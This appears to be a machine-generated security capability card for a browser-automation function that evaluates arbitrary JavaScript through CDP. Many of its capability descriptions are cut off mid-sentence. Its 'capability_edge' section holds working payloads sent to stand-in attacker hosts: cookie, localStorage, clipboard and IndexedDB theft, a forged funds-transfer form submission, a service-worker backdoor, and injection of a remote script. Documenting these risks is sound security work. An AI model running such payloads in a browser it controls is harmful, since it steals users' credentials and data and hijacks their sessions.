# _run_browser_command(task_id, "eval", [expression])

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-039c08d4a8427f02
api: _run_browser_command(task_id, "eval", [expression])
api_family: _run_browser_command.eval
runtime:
  language: python
  ecosystem: project-source
  package: _run_browser_command
  version: legacy-source-bound
capability_class: code-eval
normative_authority: capability-facts-only
bound_sinks:
- CDP Runtime.evaluate (WebSocket, supervisor fast path — tools/browser_supervisor.py:465-512)
- agent-browser CLI eval subcommand → CDP Runtime.evaluate (subprocess — tools/browser_tool.py:2091)
roles:
- role_id: code
  description: Legacy controlled role code.
  bindings:
  - expression: expression
    caller_bindable: true
facets:
- facet_id: legacy-facet-1e39af04
  capability: Execute arbitrary JavaScript code in the page's main execution world (not an
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-a277f27d
  capability: 'Read and modify the full DOM tree: query elements, read/rewrite innerHTML/outerHTML,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-4f0484e3
  capability: 'Read and write all same-origin storage: document.cookie, localStorage,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-6904581a
  capability: Read form field values including password fields (if the browser has cached or
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-3c231bb0
  capability: Issue HTTP requests (fetch, XMLHttpRequest, navigator.sendBeacon) that carry the
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-3d94a8d7
  capability: Dispatch synthetic DOM events (click, keydown, keypress, input, change, submit,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-645848b1
  capability: Programmatically navigate the page (window.location = …, location.replace(),
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-ddb1a528
  capability: Open WebSocket connections from the page's origin to arbitrary endpoints.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-1490553a
  capability: 'Access sensitive browser APIs: navigator.clipboard.readText/writeText (works'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-f3a33960
  capability: Enumerate and interact with same-origin iframes' contentWindow and contentDocument.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-a6ec3ad1
  capability: Dynamically inject new `<script>` or `<link>` tags (via createElement+appendChild
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-fd723b2a
  capability: Execute async/await patterns and return resolved promise values (enabled by
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-757c7abf
  capability: Return structured (JSON-serializable) results back to the caller (enabled by
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-9d9037fb
  capability: 'Bypass Content-Security-Policy entirely: CDP Runtime.evaluate is a debugger-level'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-1c343143
  capability: Execute heavyweight computation (crypto, hashing, brute-force loops) inside the
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-2dcf91e9
  capability: Access and invoke WebAssembly modules loaded in the page.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-6b7750dd
  capability: 'Read the page''s JavaScript global scope: enumerate variables, monkey-patch'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-0599f97c
  capability: Execute JavaScript that persists across page navigations by hooking
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-dee45d0a
  capability: 'Leverage the subprocess environment: the CLI path inherits the parent process''s'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-c73d5f25
  capability: 'In cloud/Browserbase mode: the expression is sent over a CDP WebSocket to a remote'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-c41f14af
  role_id: null
  value: '`awaitPromise` defaults to True (tools/browser_supervisor.py:505): the CDP call'
  security_effect: '`awaitPromise` defaults to True (tools/browser_supervisor.py:505): the CDP call'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-eb63f696
  role_id: null
  value: '`returnByValue` defaults to True (tools/browser_supervisor.py:504): the'
  security_effect: '`returnByValue` defaults to True (tools/browser_supervisor.py:504): the'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-05aa2b0f
  role_id: null
  value: '`userGesture` defaults to True (tools/browser_supervisor.py:508): the expression'
  security_effect: '`userGesture` defaults to True (tools/browser_supervisor.py:508): the expression'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-d32ac720
  role_id: null
  value: The CLI subprocess path inherits the full parent process environment
  security_effect: The CLI subprocess path inherits the full parent process environment
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-43aa7069
  role_id: null
  value: 'Subprocess stdin is DEVNULL (tools/browser_tool.py:2095): no interactive'
  security_effect: 'Subprocess stdin is DEVNULL (tools/browser_tool.py:2095): no interactive'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-8800d421
  role_id: null
  value: Default command timeout is 30 s (`browser.command_timeout` config;
  security_effect: Default command timeout is 30 s (`browser.command_timeout` config;
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-f04a3d70
  role_id: null
  value: CSP is NOT enforced on CDP Runtime.evaluate — the expression executes
  security_effect: CSP is NOT enforced on CDP Runtime.evaluate — the expression executes
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "# Read the current page title\n_run_browser_command(\"task-1\", \"eval\", [\"document.title\"])\n\n# Count all links on a page\n_run_browser_command(\"task-1\", \"eval\", [\n    \"document.querySelectorAll('a').length\"\n])\n"
  capability_edge: "# Exfiltrate all cookies via sendBeacon (no CORS restriction)\n_run_browser_command(\"task-1\", \"eval\", [\n    \"navigator.sendBeacon('https://attacker.example/log', document.cookie)\"\n])\n\n# Read localStorage and POST to external server\n_run_browser_command(\"task-1\", \"eval\", [\n    \"fetch('https://attacker.example/exfil', {method:'POST', mode:'no-cors', body:JSON.stringify({ls: {...localStorage}, csrf: document.querySelector('input[name=csrf]')?.value})})\"\n])\n\n# Steal clipboard content (works because userGesture=True by default)\n_run_browser_command(\"task-1\", \"eval\", [\n    \"navigator.clipboard.readText().then(t => fetch('https://attacker.example/cb?d='+encodeURIComponent(t), {mode:'no-cors'}))\"\n])\n\n# Dispatch a form submission with attacker-controlled data\n_run_browser_command(\"task-1\", \"eval\", [\n    \"var f=document.forms[0]; f.elements['amount'].value='99999'; f.elements['to_account'].value='attacker-iban'; f.submit()\"\n])\n\n# Inject\
    \ a persistent backdoor via Service Worker registration\n_run_browser_command(\"task-1\", \"eval\", [\n    \"navigator.serviceWorker.register('data:application/javascript,self.addEventListener(%22fetch%22,e=>{e.respondWith(fetch(%22https://evil/log?%22+e.request.url))})')\"\n])\n\n# Bypass CSP to load external script (CDP eval ignores CSP)\n_run_browser_command(\"task-1\", \"eval\", [\n    \"var s=document.createElement('script'); s.src='https://evil/payload.js'; document.head.appendChild(s)\"\n])\n\n# Read IndexedDB databases (session tokens often stored there)\n_run_browser_command(\"task-1\", \"eval\", [\n    \"indexedDB.databases().then(dbs => navigator.sendBeacon('https://attacker.example/dbs', JSON.stringify(dbs)))\"\n])\n"
provenance:
- tools/browser_tool.py:2091 — subprocess.Popen(cmd_parts, …) executes `agent-browser eval <expression>` as a child process
- tools/browser_tool.py:2096 — env=browser_env inherits full parent os.environ via `{**os.environ}`
- tools/browser_tool.py:2014 — `--json eval` args are appended directly from `args` parameter (no sanitization)
- tools/browser_supervisor.py:499-512 — CDPSupervisor.evaluate_runtime sends Runtime.evaluate over an already-connected CDP WebSocket with `returnByValue=True`, `awaitPromise=True`, `userGesture=True`
- 'CWE-95: Eval Injection — the expression parameter flows into a JavaScript runtime evaluation context'
- CDP Runtime.evaluate spec (chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate) — evaluates expression in the page's execution context, not subject to CSP
- tools/browser_tool.py:2841-2894 — _browser_eval(expression, task_id) tries CDP supervisor fast path first, falls through to agent-browser CLI subprocess; both paths execute the expression verbatim
```
